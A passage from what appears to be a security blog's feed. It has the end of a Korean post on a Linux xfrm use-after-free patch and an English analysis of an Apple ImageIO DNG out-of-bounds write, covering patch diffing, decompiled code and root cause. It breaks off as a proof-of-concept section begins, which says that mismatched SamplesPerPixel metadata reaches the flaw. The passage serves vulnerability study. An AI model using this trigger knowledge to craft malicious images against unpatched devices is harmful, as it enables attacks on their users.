&#xAC12;&#xC774; 0&#xC774;&#xBA74; <code>byspi</code> &#xBAA9;&#xB85D;&#xC5D0;&#xC11C; &#xC81C;&#xAC70;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xB530;&#xB77C;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC;&#xB294; &#xD574;&#xC81C;&#xB418;&#xC9C0;&#xB9CC;, <code>byspi</code> &#xBAA9;&#xB85D;&#xC5D0;&#xB294; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; dangling pointer&#xAC00; &#xB0A8;&#xC544; UAF&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">--- a/net/xfrm/xfrm_state.c+++ b/net/xfrm/xfrm_state.c<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">xfrm_alloc_spi</span><span class="hljs-params">(struct xfrm_state *x, u32 low, u32 high,</span></span><span class="hljs-function"><span class="hljs-params">   struct netlink_ext_ack *extack)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">//... </span> <span class="hljs-keyword">for</span> (h = <span class="hljs-number">0</span>; h &lt; range; h++) { u32 spi = (low == high)? low : get_random_u32_inclusive(low, high);+<span class="hljs-keyword">if</span> (spi == <span class="hljs-number">0</span>)+<span class="hljs-keyword">goto</span> next; newspi = htonl(spi);<span class="hljs-comment">//...</span> xfrm_state_put(x0); spin_unlock_bh(&amp;net-&gt;xfrm.xfrm_state_lock);+next: <span class="hljs-keyword">if</span> (signal_pending(current)) { err = -ERESTARTSYS; <span class="hljs-keyword">goto</span> unlock;</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58; &#xCEE4;&#xBC0B;(<a href="https://github.com/torvalds/linux/commit/cd8ae32e4e4652db55bce6b9c79267d8946765a9">cd8ae32e4e4652db55bce6b9c79267d8946765a9</a>)&#xC740; <code>xfrm_alloc_spi</code> &#xD568;&#xC218;&#xAC00; spi &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xAE30; &#xC804;, spi&#xAC12;&#xC774; 0&#xC774;&#xBA74; &#xD560;&#xB2F9;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/xfrm/">xfrm</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2025-39965/">cve-2025-39965</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/26/l0ch/2025-10-26/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] ImageIO: iOS/macOS DNG Image Processing Memory Corruption (En)</title>
      <link>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_en/</link>
      <guid>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_en/</guid>
      <pubDate>Thu, 23 Oct 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/23/clalxk/imageIO_en/image.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;Hello~ After finishing the macOS series, we&amp;#x2019;re back thi</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/23/clalxk/imageIO_en/image.png" alt="image.png"></p><p>Hello~ After finishing the macOS series, we&#x2019;re back this time with <strong>ImageIO</strong>.</p><p>On <strong>August 20th</strong>, a vulnerability was discovered in the ImageIO framework used by iOS, macOS, and iPadOS.</p><p>It was reportedly exploited in the wild to target specific individuals &#x2014; let&#x2019;s analyze what kind of vulnerability it was!</p><p>Shall we begin? &#x1F60E;</p><hr><h1 id="0-ImageIO"><a href="#0-ImageIO" class="headerlink" title="0. ImageIO"></a>0. <a href="https://developer.apple.com/documentation/imageio">ImageIO</a></h1><p><strong>ImageIO</strong> is Apple&#x2019;s <strong>image processing framework</strong> used across macOS, iOS, and iPadOS.</p><p>It provides APIs for <strong>reading, writing, accessing metadata, compression, and decoding</strong></p><p>for a wide range of image formats. It serves as the image processing backend for many system apps and features &#x2014; including <strong>Core Graphics</strong>, <strong>Photos</strong>, <strong>Preview</strong>, <strong>Safari</strong>, <strong>Messages</strong>, <strong>AirDrop</strong>, <strong>Mail</strong>, and <strong>iCloud.</strong></p><h1 id="1-CVE-2025-43300"><a href="#1-CVE-2025-43300" class="headerlink" title="1. CVE-2025-43300"></a>1. CVE-2025-43300</h1><p><img src="/2025/10/23/clalxk/imageIO_en/image1.png" alt="image.png"></p><p>This vulnerability is an <strong>Out-of-Bounds Write</strong> in the JPEG Lossless (<code>SOF3</code>) decoder</p><p>(<code>CDNGLosslessJpegUnpacker</code>) of Apple&#x2019;s ImageIO framework, specifically within <strong>RawCamera</strong>.</p><p>It occurs when the DNG file&#x2019;s TIFF tag (<code>SamplesPerPixel</code>) does <strong>not match</strong> the number of components declared in the internal JPEG stream &#x2014; leading to incorrect loop boundaries and thus a buffer overwrite.</p><p>It was patched in <strong>iOS 18.6.2</strong>, released on <strong>August 20, 2025</strong>.</p><ul><li>Vulnerable version: <strong>iOS 18.6.1</strong></li><li>Patched version: <strong>iOS 18.6.2</strong></li></ul><p>We first wanted to identify <strong>where the patch was applied</strong>.</p><p>Using the public project <a href="https://github.com/blacktop/ipsw-diffs/tree/main"><strong>ipsw-diffs</strong></a>,</p><p>we compared the binaries between <strong>18.6.1</strong> and <strong>18.6.2</strong>.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image2.png" alt="image.png"></p><p>Everything else remained unchanged &#x2014; only <strong>RawCamera</strong> was modified.</p><p><strong>RawCamera</strong></p><blockquote><p>/System/Library/CoreServices/RawCamera.bundle/RawCamera</p></blockquote><pre><code class="hljs bash">-1738.140.3.0.0-  __TEXT.__text: 0x1e2d70-  __TEXT.__auth_stubs: 0x1850+1738.140.3.0.11+  __TEXT.__text: 0x1e3470+  __TEXT.__auth_stubs: 0x1870   __TEXT.__objc_methlist: 0x16e4   __TEXT.__const: 0x15326-  __TEXT.__gcc_except_tab: 0x2d440+  __TEXT.__gcc_except_tab: 0x2d588   __TEXT.__oslogstring: 0xec0   __TEXT.__cstring: 0xee23   __TEXT.__dof_RawCamera: 0x8f7-  __TEXT.__unwind_info: 0xb1d0+  __TEXT.__unwind_info: 0xb1e8   __TEXT.__eh_frame: 0x278   __TEXT.__objc_classname: 0x4b9   __TEXT.__objc_methname: 0x3918   __TEXT.__objc_methtype: 0xdd3   __TEXT.__objc_stubs: 0x2da0-  __DATA_CONST.__got: 0x9b0+  __DATA_CONST.__got: 0x9c8   __DATA_CONST.__const: 0x2a18   __DATA_CONST.__objc_classlist: 0x1e0   __DATA_CONST.__objc_catlist: 0x20   __DATA_CONST.__objc_imageinfo: 0x8   __DATA_CONST.__objc_selrefs: 0xcf8   __DATA_CONST.__objc_superrefs: 0xf0-  __DATA_CONST.__objc_arraydata: 0x3948-  __AUTH_CONST.__auth_got: 0xc40+  __DATA_CONST.__objc_arraydata: 0x3950+  __AUTH_CONST.__auth_got: 0xc50   __AUTH_CONST.__const: 0x35978   __AUTH_CONST.__cfstring: 0x18080   __AUTH_CONST.__objc_const: 0x48b0-  __AUTH_CONST.__objc_arrayobj: 0x570-  __AUTH_CONST.__objc_intobj: 0x39f0+  __AUTH_CONST.__objc_arrayobj: 0x588+  __AUTH_CONST.__objc_intobj: 0x3a20   __AUTH_CONST.__objc_doubleobj: 0x480   __AUTH_CONST.__objc_dictobj: 0x4d58   __AUTH_CONST.__objc_floatobj: 0xc0   - /System/Library/Frameworks/UniformTypeIdentifiers.framework/UniformTypeIdentifiers   - /System/Library/PrivateFrameworks/AppleJPEG.framework/AppleJPEG   - /System/Library/PrivateFrameworks/AppleJPEGXL.framework/AppleJPEGXL+  - /System/Library/PrivateFrameworks/CMPhoto.framework/CMPhoto   - /System/Library/PrivateFrameworks/CoreAnalytics.framework/CoreAnalytics   - /System/Library/PrivateFrameworks/MobileAsset.framework/MobileAsset   - /usr/lib/libSystem.B.dylib   - /usr/lib/libobjc.A.dylib   - /usr/lib/libxml2.2.dylib   - /usr/lib/libz.1.dylib-  UUID: 1BE38EB6-51C0-3069-A50F-CA3B000E0847-  Functions: 6433-  Symbols:   781+  UUID: AF5B7B35-3549-329B-B706-F877FA8DF849+  Functions: 6435+  Symbols:   786   CStrings:  7487 Symbols:+ _CMPhotoDecompressionContainerCreateImageForIndex+ _CMPhotoDecompressionContainerGetImageCount+ _CMPhotoDecompressionSessionCreate+ _CMPhotoDecompressionSessionCreateContainer+ _CVPixelBufferGetDataSize+ _kCMPhotoContainerFormatString_JFIF+ _kCMPhotoDecompressionContainerOption_AllowedFormatsAndCodecs+ _kCMPhotoDecompressionOption_OutputPixelFormat- _CGImageGetBytesPerRow- _CGImageGetHeight- _CGImageGetWidth</code></pre><p>Since the diff does not show code-level changes, we moved to <strong>IDA Pro</strong> for deeper inspection.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image3.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image4.png" alt="image.png"></p><p>We used <strong>ipsw</strong> to download both 18.6.1 and 18.6.2 firmwares.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image5.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image6.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image7.png" alt="image.png"></p><p>The <code>dyld_shared_cache</code> is a cache file that bundles frequently used system libraries and frameworks together for faster loading during iOS/macOS boot. It contains optimized versions of <code>.dylibs</code> and frameworks, allowing faster app startup and reduced memory usage.<br>Since the actual system loads these cached binaries, we can extract RawCamera directly from the cache for comparison and analysis.</p><p>Although it can also be extracted using <code>ipsw dyld extract</code>, in this research, we analyzed it</p><p>directly by loading <code>dyld_shared_cache</code> in IDA.</p><h2 id="1-1-bindiff"><a href="#1-1-bindiff" class="headerlink" title="1.1 bindiff"></a>1.1 bindiff</h2><p><img src="/2025/10/23/clalxk/imageIO_en/image8.png" alt="image.png"></p><p>The binary was exported in <strong>BinExport</strong> format for diffing.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image9.png" alt="image.png"></p><p>Due to limited space, we referred to public analysis from Quarkslab<br>: <a href="https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html">https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html</a></p><p>Out of six modified functions, two &#x2014; <code>sub_1DD8A7684</code> and <code>sub_1DD95DC1C</code> &#x2014; were significantly changed. We focused our analysis on these two.</p><h2 id="1-2-Analysis"><a href="#1-2-Analysis" class="headerlink" title="1.2 Analysis"></a>1.2 Analysis</h2><p><img src="/2025/10/23/clalxk/imageIO_en/image10.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image11.png" alt="image.png"></p><p>We loaded <code>dyld_shared_cache</code> extracted from ipsw for analysis:<br><em>&#x2192; Apple DYLD Cache for arm64e (select module(s)) &#x2192; RawCamera</em></p><p><img src="/2025/10/23/clalxk/imageIO_en/image12.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image13.png" alt="image.png"></p><p>A new <strong>pixel buffer size verification step</strong> was added.</p><p>See the following section for detailed code comparison.</p><h3 id="Code-Analysis"><a href="#Code-Analysis" class="headerlink" title="Code Analysis"></a><strong>Code Analysis</strong></h3><p><code>sub_1DD8A7684</code> &#x2192; <code>sub_1DD8A76DC</code> </p><pre><code class="hljs cpp"># iOS <span class="hljs-number">18.6</span><span class="hljs-number">.1</span> G90<span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD8A7684</span><span class="hljs-params">(...)</span></span><span class="hljs-function"><span class="hljs-comment">// shortened: legacy CGImage path</span></span><span class="hljs-function"></span>{    v13 = CGImageSourceCreateWithData(...);    ImageAtIndex = CGImageSourceCreateImageAtIndex(v13, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    BytesPerRow = CGImageGetBytesPerRow(ImageAtIndex);    <span class="hljs-keyword">if</span> (CFDataGetLength(data) != <span class="hljs-number">4</span> * width * height)        <span class="hljs-keyword">throw</span> RawCameraException;    ...}</code></pre><pre><code class="hljs c"># iOS <span class="hljs-number">18.6</span><span class="hljs-number">.2</span> G100<span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD8A76DC</span><span class="hljs-params">(...)</span></span><span class="hljs-function"><span class="hljs-comment">// shortened: new CMPhoto + CVPixelBuffer path</span></span><span class="hljs-function"></span>{    CMPhotoDecompressionSessionCreate(...);    CMPhotoDecompressionContainerCreateImageForIndex(...);    BytesPerRow = CVPixelBufferGetBytesPerRow(buf);    DataSize = CVPixelBufferGetDataSize(buf);    <span class="hljs-keyword">if</span> (DataSize != expected)        <span class="hljs-keyword">throw</span> RawCameraException;    ...}</code></pre><h3 id="Key-Differences"><a href="#Key-Differences" class="headerlink" title="Key Differences"></a>Key Differences</h3><ol><li><p><strong>CGImage &#x2192; CMPhoto + CVPixelBuffer</strong></p><ul><li><p><strong>G90 (18.6.1):</strong></p><p>  Uses CoreGraphics pipeline (<code>CGImageSourceCreateImageAtIndex</code> + <code>CGDataProviderCopyData</code>)</p><p>  and directly iterates raw <code>CFData</code> bytes.</p></li><li><p><strong>G100 (18.6.2):</strong></p><p>  Introduces <strong>CMPhoto</strong> decompression pipeline:</p><p>  <code>CMPhotoDecompressionSessionCreate &#x2192; CMPhotoDecompressionContainerCreateImageForIndex</code> &#x2192; <code>CVPixelBuffer</code>.</p><p>  Accesses pixels through <strong>CVPixelBufferLockBaseAddress()</strong>, ensuring safer memory handling.</p></li></ul></li><li><p><strong>Buffer Size Validation Added</strong></p> <pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (CFDataGetLength(data) != <span class="hljs-number">4</span> * width * height) <span class="hljs-keyword">throw</span> RawCameraException;</code></pre><ul><li><p><strong>Before:</strong> Only checked <code>CFDataGetLength() == 4 * width * height</code>.</p><p>  This ignored row padding (<code>bytesPerRow</code>) and format variations.</p></li></ul></li></ol><pre><code><pre><code class="hljs cpp">BytesPerRow = CVPixelBufferGetBytesPerRow(buf);DataSize    = CVPixelBufferGetDataSize(buf);<span class="hljs-comment">// expected = f(width, height)  // sub_1DD8A8C14</span><span class="hljs-comment">// bpp = 4                       // v68=4 &#x2192; sub_1DD8A8C7C</span><span class="hljs-keyword">if</span> (DataSize != expected) <span class="hljs-keyword">throw</span> RawCameraException;</code></pre>- **After:** Validates using `CVPixelBufferGetDataSize()` against an internally computed expected value (considering stride).    &#x2192; Prevents overrun caused by underestimated buffer size.</code></pre><ol><li><strong>Pixel Channel Order</strong><ul><li><strong>Old:</strong> Assumed RGB order, manual pointer increments.</li><li><strong>New:</strong> Explicitly treats buffer as BGRA, reading channels in fixed offsets (B&#x2192;G&#x2192;R).</li></ul></li></ol><hr><p><strong>Summary:</strong></p><p>The patch migrated from <strong>CoreGraphics raw byte decoding</strong> to a <strong>CoreMedia Photo pipeline</strong></p><p>and added <strong>explicit data size/stride checks</strong>, eliminating unbounded writes from mismatched DNG metadata.</p><p>Through the analysis of the modified code, we were able to understand the general behavior of the function.</p><p>In summary, <strong>G90 (iOS 18.6.1)</strong> decodes the image through the <strong>CGImage</strong> path and directly iterates over the <strong>CFData</strong> buffer. The verification process only checks two things &#x2014; the <strong>match of width and height</strong>, and whether <strong>CFDataGetLength() == 4 &#xD7; W &#xD7; H</strong> &#x2014; while actual memory access is performed using a <strong>row-based offset (</strong><code>BytesPerRow</code><strong>)</strong>. Because of this, for certain images (depending on color space, subsampling, or row padding), the validation may <strong>pass successfully, but the actual access can exceed the bounds of CFData</strong>.</p><p>In contrast, <strong>G100 (iOS 18.6.2)</strong> fixes this issue by switching the decoding pipeline from <strong>CGImage &#x2192; CMPhoto (JFIF only) &#x2192; CVPixelBuffer</strong>, and comparing the <strong>actual total buffer size (</strong><code>CVPixelBufferGetDataSize</code><strong>)</strong> against an <strong>expected value</strong> computed internally based on width, height, and other parameters.</p><hr><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>(Analyzed based on the G90 version)</p><p>During analysis, we observed that <code>sub_1DD8A7684</code> makes a function call through a <strong>vtable</strong>.</p><p>In C++, every object typically begins with a <strong>vptr (virtual table pointer)</strong>.</p><p>Virtual function calls are made at runtime through that pointer &#x2014; something like <code>this-&gt;vptr[slot]</code>.</p><p>However, since the RawCamera binary is <strong>fully stripped</strong>, only addresses are visible,</p><p>making direct analysis difficult.</p><pre><code class="hljs cpp">[ex](*(*<span class="hljs-keyword">this</span>)+<span class="hljs-number">0xE0</span>)(<span class="hljs-keyword">this</span>, buf, w, h)</code></pre><p>which conceptually means:</p><pre><code class="hljs cpp">[ex]<span class="hljs-keyword">this</span>-&gt;vptr-&gt;unpack_lossless(<span class="hljs-keyword">this</span>, buf, w, h)</code></pre><p>To make it more readable and traceable, I defined the vtable as a structure (class) in IDA using an IDAPython script.</p><p>The script did the following:</p><ol><li>Parse the vtable and create a corresponding struct.</li><li>Apply <code>struct CDNGLosslessJpegUnpacker *this</code> as the first parameter for all virtual functions.</li></ol><p>Once this is done, the call expression <code>(*(*this)+0xE0)(this)</code> appears as <code>this-&gt;vptr-&gt;fn_028(this, &#x2026;)</code>, and fields like <code>this-&gt;field_d8</code> become explicit &#x2014; making slot mapping and call tracing much easier.</p><p>Now, let&#x2019;s identify where the vulnerable function is actually invoked in the call tree.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image14.png" alt="image.png"></p><p>Filtering for &#x201C;Lossless&#x201D; quickly reveals the target class</p><p><code>CDNGLosslessJpegUnpacker</code>.</p><p>Following the references leads to the function <code>sub_1DD95DE88</code>.</p><p><strong>Detailed Code (sub_1DD95DE88)</strong></p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD95DE88</span><span class="hljs-params">(<span class="hljs-keyword">os_signpost_id_t</span> a1, __int64 a2, __int64 a3, __int64 a4)</span></span><span class="hljs-function"></span>{  .  .  .    <span class="hljs-keyword">if</span> ( *(_DWORD *)(a1 + <span class="hljs-number">216</span>)    || (*(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> (__fastcall **)(<span class="hljs-keyword">os_signpost_id_t</span>))(*(_QWORD *)a1 + <span class="hljs-number">224L</span>L))(a1) == <span class="hljs-number">2</span>    || (v12 = *(_QWORD *)(a1 + <span class="hljs-number">240</span>) - *(_QWORD *)(a1 + <span class="hljs-number">232</span>), v12 == <span class="hljs-number">4</span>) )  {    sub_1DD9009D4(a1, a2, a3, a4);  }  <span class="hljs-keyword">else</span>  {    v14 = *(_DWORD *)(a1 + <span class="hljs-number">44</span>);    v13 = *(_DWORD *)(a1 + <span class="hljs-number">48</span>);    v15 = *(_DWORD *)(a1 + <span class="hljs-number">224</span>);    v16 = *(_DWORD *)(a1 + <span class="hljs-number">228</span>);    *(_QWORD *)&amp;v35 = v12 &gt;&gt; <span class="hljs-number">2</span>;    sub_1DD8731E0(&amp;v36, &amp;v35);    <span class="hljs-keyword">if</span> ( *(_QWORD *)(a1 + <span class="hljs-number">240</span>) - *(_QWORD *)(a1 + <span class="hljs-number">232</span>) != *(_QWORD *)(a1 + <span class="hljs-number">264</span>) - *(_QWORD *)(a1 + <span class="hljs-number">256</span>)      || (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v14 - <span class="hljs-number">100000</span>) &lt; <span class="hljs-number">0xFFFE7961</span>      || (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v13 - <span class="hljs-number">100000</span>) &lt; <span class="hljs-number">0xFFFE7961</span>      || v15 - <span class="hljs-number">100000</span> &lt; <span class="hljs-number">0xFFFE7961</span>      || v16 - <span class="hljs-number">100000</span> &lt; <span class="hljs-number">0xFFFE7961</span>      || (v28 = v11, v17 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v36, v36 &gt;= <span class="hljs-number">20000</span>) )    {      exception_15 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-built_in">std</span>::runtime_error::runtime_error(exception_15, <span class="hljs-string">&quot;RawCameraException&quot;</span>);      __cxa_throw(exception_15, MEMORY[<span class="hljs-number">0x1E6FA15F0</span>], MEMORY[<span class="hljs-number">0x1E6FA1480</span>]);    }    v29 = a4;    <span class="hljs-keyword">if</span> ( (((v13 + v16 - <span class="hljs-number">1</span>) / v16) &gt;&gt; (*(_DWORD *)(a1 + <span class="hljs-number">216</span>) != <span class="hljs-number">0</span>)) * ((v14 + v15 - <span class="hljs-number">1</span>) / v15) != v36 )    {      v27 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v27, <span class="hljs-string">&quot;RawCameraException&quot;</span>);      __cxa_throw(v27, MEMORY[<span class="hljs-number">0x1E6FA15F0</span>], MEMORY[<span class="hljs-number">0x1E6FA1480</span>]);    }    group = dispatch_group_create();    v30 = dispatch_queue_create(<span class="hljs-string">&quot;Lossless DNG Tile Unpacker Queue&quot;</span>, MEMORY[<span class="hljs-number">0x1E6FA52F0</span>]);</code></pre><p>The function performs <strong>three checks</strong>:</p><ol><li><code>[this+0xD8] != 0</code></li><li><code>vtable[28](this) == 2</code></li><li><code>[this+0xF0] - [this+0xE8] == 4</code></li></ol><p>If <strong>any</strong> of these conditions is true, it calls <code>sub_1DD9009D4()</code> and <strong>exits safely</strong>.</p><p>Otherwise, it proceeds to the <strong>&#x201C;Tile Queue&#x201D;</strong> path &#x2014; which includes the vulnerable function chain.</p><pre><code class="hljs c">; Check <span class="hljs-number">1</span>LDR   W8, [X23,#<span class="hljs-number">0xD8</span>]CBNZ  W8, loc_1DD95DF78; Check <span class="hljs-number">2</span>LDR   X16, [X23]AUTDA X16, X17LDR   X8, [X16,#<span class="hljs-number">0xE0</span>]!  ; vtable[<span class="hljs-number">0xE0</span>/<span class="hljs-number">8</span>] -&gt; slot <span class="hljs-number">28</span>MOV   X0, X23BLRAA X8, X17CMP   W0, #<span class="hljs-number">2</span>BEQ   loc_1DD95DF78; Check <span class="hljs-number">3</span>LDP   X9, X8, [X23,#<span class="hljs-number">0xE8</span>]SUB   X8, X8, X9CMP   X8, #<span class="hljs-number">4</span>B.NE  loc_1DD95E008</code></pre><p>If none of the above branches are taken, the function reaches a section where a dispatch queue named <code>&quot;Lossless DNG Tile Unpacker Queue&quot;</code> is created &#x2014; this is the path that eventually leads to the vulnerable unpacking logic.</p><pre><code class="hljs angelscript"><span class="hljs-comment">// sub_1DD95DE88 simplified</span><span class="hljs-keyword">if</span> ([<span class="hljs-keyword">this</span>+<span class="hljs-number">0xD8</span>] != <span class="hljs-number">0</span> || vtable[<span class="hljs-number">28</span>](<span class="hljs-keyword">this</span>) == <span class="hljs-number">2</span> || ([<span class="hljs-keyword">this</span>+<span class="hljs-number">0xF0</span>]-[<span class="hljs-keyword">this</span>+<span class="hljs-number">0xE8</span>]) == <span class="hljs-number">4</span>){    sub_1DD9009D4(...); <span class="hljs-comment">// safe path</span>} <span class="hljs-keyword">else</span> {    <span class="hljs-comment">// Vulnerable path</span>    dispatch_group_create();    dispatch_queue_create(<span class="hljs-string">&quot;Lossless DNG Tile Unpacker Queue&quot;</span>, ...);    sub_1DD95E410 &#x2192; sub_1DD95DCD8 &#x2192; sub_1DD95E4A4 <span class="hljs-keyword">or</span> sub_1DD95B198    &#x2192; sub_1DD95EA64 &#x2192; sub_1DDA4EF58}</code></pre><p>Thus, when all three conditions fail,<br>the code spawns a tile-based decompression queue that ultimately triggers the vulnerable unpack routine.</p><h3 id="What-is-the-Tile-Queue"><a href="#What-is-the-Tile-Queue" class="headerlink" title="What is the Tile Queue?"></a>What is the Tile Queue?</h3><p>The <strong>tile queue</strong> splits a large image into small rectangular <strong>tiles</strong> (TileWidth &#xD7; TileLength).</p><p>Each tile is decoded, color-corrected, and placed in the output buffer.</p><p>The vulnerable path processes each tile independently but assumes metadata consistency between <strong>SamplesPerPixel</strong> and <strong>NumComponents</strong> &#x2014; which, when mismatched, causes a buffer overflow.</p><p><strong>Simplified Call Tree</strong></p><pre><code class="hljs c"><span class="hljs-number">0x1DD95DE88</span>    <span class="hljs-number">0x1DD95E410</span>        <span class="hljs-number">0x1DD95DCD8</span>            <span class="hljs-number">0x1DD95E4A4</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x1DD95B198</span>                <span class="hljs-number">0x1DD95EF54</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x1DD95EA64</span>                    <span class="hljs-number">0x1DDA4EF58</span></code></pre><hr><p><img src="/2025/10/23/clalxk/imageIO_en/image15.png" alt="image.png"></p><p>Boom &#x1F4A5; &#x2014; and with a clearer head, let&#x2019;s continue &gt;&lt;</p><hr><p>Before diving into the PoC,</p><p>let&#x2019;s briefly recap the <strong>background concepts</strong> necessary to understand this behavior.</p><hr><h2 id="Background-Concepts"><a href="#Background-Concepts" class="headerlink" title="Background Concepts"></a>Background Concepts</h2><h3 id="1-Pixels-Channels-Samples-and-Bit-Depth"><a href="#1-Pixels-Channels-Samples-and-Bit-Depth" class="headerlink" title="1. Pixels, Channels (Samples), and Bit Depth"></a>1. Pixels, Channels (Samples), and Bit Depth</h3><ul><li><strong>Pixel</strong>: The smallest visual unit of an image.</li><li><p><strong>Channel (Sample)</strong>: A single numeric component representing one aspect of a pixel (R, G, B, etc.).</p><p>  &#x2192; <code>SamplesPerPixel</code> = number of channels per pixel</p><p>  &#x2192; <code>BitsPerSample</code> = number of bits used to represent each channel</p></li></ul><p>Examples:</p><div class="table-container"><table><thead><tr><th>Type</th><th>SamplesPerPixel</th><th>BitsPerSample</th><th>Bytes per Pixel</th></tr></thead><tbody><tr><td>Grayscale</td><td>1</td><td>8</td><td>1</td></tr><tr><td>RGB 8bpc</td><td>3</td><td>8</td><td>3</td></tr><tr><td>RGBA 16bpc</td><td>4</td><td>16</td><td>8</td></tr></tbody></table></div><p>These metadata values determine <strong>buffer size</strong>, <strong>stride (bytes per row)</strong>, and <strong>loop boundaries</strong> in decompression.</p><h3 id="2-DNG"><a href="#2-DNG" class="headerlink" title="2. DNG"></a>2. DNG</h3><p>DNG (Digital Negative) is <strong>Adobe&#x2019;s RAW image container format</strong>, built upon <strong>TIFF/EP</strong> structure.</p><p>It stores raw sensor data (e.g., Bayer CFA), thumbnails, and color correction metadata.</p><p>Key tags:</p><ul><li><strong>RowsPerStrip / TileWidth / TileLength</strong></li><li><strong>StripOffsets / TileOffsets</strong></li><li><strong>StripByteCounts / TileByteCounts</strong></li><li><strong>SamplesPerPixel / BitsPerSample</strong></li></ul><p>The decoder uses these values to calculate</p><p><strong>buffer offsets</strong>, <strong>BytesPerRow</strong>, and <strong>total data size</strong> for writing.</p><h3 id="3-RAW-and-Compression"><a href="#3-RAW-and-Compression" class="headerlink" title="3. RAW and Compression"></a>3. RAW and Compression</h3><p>RAW data is unprocessed, high bit-depth sensor output (e.g., 12/14/16 bits per pixel, typically 1 sample per pixel).</p><p>To save space, DNG supports <strong>lossless compression</strong>, most notably <strong>JPEG Lossless (SOF3)</strong>.</p><ul><li>Compression = 1 &#x2192; Uncompressed</li><li>Compression = 7 &#x2192; JPEG (Baseline or Lossless)</li><li>Compression = 8 &#x2192; Deflate (ZIP)</li><li>Compression = 34892 &#x2192; JPEG Baseline (Lossy)</li></ul><p>&#x2705; The vulnerability resides in the <strong>Lossless JPEG (SOF3)</strong> decoding path.</p><hr><h2 id="1-3-PoC"><a href="#1-3-PoC" class="headerlink" title="1.3 PoC"></a>1.3 PoC</h2><p><img src="/2025/10/23/clalxk/imageIO_en/image16.png" alt="image.png"></p><p>Normal DNG files typically <strong>do not</strong> reach the vulnerable path.</p><p>However, by tweaking metadata tags (for example, <code>SamplesPerPixel</code>) so that the initial checks pass, we can force the code path to invoke the vulnerable function.</p><p>I ran this on my phone without updating it (because I had no space &#x1F602;).</p><p><img src="/2025/10/23/clalxk/imageIO_en/image17.png" alt="image.png"></p><p>My device is on <strong>iOS 18.1.1</strong>.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image18.png" alt="image.png"></p><p>Using the small DNG viewer app above, I loaded the PoC DNG and observed the following:</p><pre><code class="hljs c"><span class="hljs-keyword">import</span> SwiftUI<span class="hljs-keyword">import</span> UniformTypeIdentifiers<span class="hljs-keyword">import</span> Combine<span class="hljs-keyword">import</span> UIKit<span class="hljs-keyword">import</span> CoreImage<span class="hljs-keyword">import</span> CoreImage.CIFilterBuiltins@main<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DNGViewerApp</span>:</span> App {    var body: some Scene {        WindowGroup {            ContentView()        }    }}<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RawRenderer</span>:</span> ObservableObject {    <span class="hljs-keyword">private</span> let context = CIContext(options: [        .cacheIntermediates: <span 